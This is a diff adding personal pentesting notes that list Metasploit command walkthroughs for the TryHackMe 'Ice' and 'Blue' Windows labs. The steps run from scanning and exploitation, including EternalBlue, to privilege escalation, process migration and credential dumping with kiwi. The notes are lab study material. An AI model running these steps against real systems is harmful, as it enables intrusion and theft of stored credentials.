@@ -224,3 +224,71 @@ useful cheatsheets https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
 > set SMBpass paste the hash
 > run
 > getprivs (done)
+
+
+
+
+--WINDOWS HACKING thm-ice--
+
+> nmap -sS target_machine_ip
+> nmap -sV target_machine_ip
+> nmap -sC target_machine_ip                                                                                                                                          (Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified then find a vunerability) 
+> msfconsole
+> search exploit_name
+> use exploit_id
+> show options
+> set RHOSTS target_machine_ip
+> set LHOST attack_machine_ip
+> exploit
+> meterpreter> getuid
+> meterpreter> sysinfo
+> meterpreter> run post/multi/recon/local_exploit_suggester (choose an exploit)
+> meterpreter> background or ctrl + z
+> use full_path_for_exlpoit_name
+> show options
+> set SESSION session_number
+> ip addr (to check ip address)
+> exploit
+> meterpreter> getprivs
+> meterpreter> ps
+> meterppreter> migrate -N process_name                                                                                                                             (In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service and a process that has the same permissions as lsass.)
+> meterpreter> getuid (we've made our way to full administrator permissions)
+> meterpreter> load kiwi
+> meterpreter> help
+> meterpreter> creds_all
+
+
+
+
+--WINDOWS HACKING thm-blue--
+
+> nmap -sS target_machine_ip
+> nmap -sV target_machine_ip
+> nmap -sC target_machine_ip
+> ls -al /usr/share/nmap/scripts | grep -e "smb-"
+> nmap -sS -Pn -p 445 10.10.245.66 --script smb-vuln-ms17-010.nse
+> msfconsole
+> search ms17-010 (choose eternal blue module)
+> use module_id
+> show options
+> set rhosts
+> set lhost
+> exploit
+> shell> background
+> search shell_to_meterpreter
+> use post/multi/manage/shell_to_meterpreter
+> show options
+> set lhost
+> set different_lport
+> set session
+> exploit
+> sessions
+> sessions -i meterpeter_session_id
+> meterpreter> ps
+> meterpreter> migrate PID
+> meterpreter> 
+
+
+
+
+----
